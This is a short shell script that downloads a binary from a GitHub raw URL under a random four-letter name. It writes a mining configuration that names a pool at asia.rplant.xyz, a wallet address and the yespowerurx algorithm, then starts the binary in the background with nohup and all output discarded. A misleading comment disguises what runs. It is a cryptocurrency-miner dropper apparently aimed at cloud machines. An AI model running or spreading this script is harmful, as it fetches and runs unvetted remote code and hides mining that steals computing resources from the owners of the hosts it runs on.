NAME=$(tr -dc A-Za-z </dev/urandom | head -c 4)

wget -q -O "${NAME}" https://raw.githubusercontent.com/DOT-SUNDA/cloudsigma/refs/heads/main/JOKO
current_date=$(TZ=UTC-7 date +"%H-%M [%d-%m]")
cat > config.json <<END
{
  "url": "asia.rplant.xyz:7059",
  "user": "UbE2oTS6jQHUeDnhjLHTYLEMJjJ5yiGfgM.CS-ASIA",
  "pass": "x",
  "threads": 1,
  "algo": "yespowerurx"
}
END

chmod +x config.json "${NAME}"

# Run cidx in the background
nohup ./$NAME -c 'config.json' &>/dev/null &
